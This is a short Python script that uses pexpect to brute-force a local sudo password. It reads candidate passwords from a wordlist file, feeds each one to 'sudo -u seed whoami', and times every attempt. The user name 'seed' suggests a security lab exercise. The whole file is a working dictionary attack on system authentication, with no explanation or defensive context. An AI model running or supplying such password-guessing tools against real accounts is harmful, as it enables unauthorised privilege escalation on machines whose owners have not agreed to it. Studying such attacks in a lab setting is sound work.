import time

import pexpect

def sudo_login(username, password):
    try:
        # Spawn a new process for the sudo command
        child = pexpect.spawn('sudo -u {} whoami'.format(username))
        
        # Wait for the password prompt
        index = child.expect(['assword:', pexpect.EOF], timeout=10)
        
        if index == 0:
            # Send the password
            child.sendline(password)
            
            # Wait for the command to complete
            index = child.expect([pexpect.EOF], timeout=10)
            
            if index == 0:
                # Password is correct, print the output
                print("Logged in as", child.before.decode().strip())
            else:
                print("Command did not complete successfully.")
        else:
            print("Password prompt not found.")

    except pexpect.exceptions.TIMEOUT:
        # Timeout occurred. Unable to login.
        print("Timeout occurred. Unable to login.")


def read_words_from_file(filename):
    words = []
    with open(filename, 'r') as file:
        for line in file:
            # Split the line into words using whitespace as delimiter
            line_words = line.split()
            # Add words to the list
            words.extend(line_words)
    return words
    
def login(username, provided_password):
    start_time= time.time()
    sudo_login(username, provided_password)
    end_time = time.time()
    execution_time = end_time - start_time
    print("Execution time:", execution_time, "seconds")

def main():
    filename = '1.txt'  
    username = "seed"
    actual_password = read_words_from_file(filename)
    for password in actual_password:
        login(username, password)

if __name__ == "__main__":
    main()
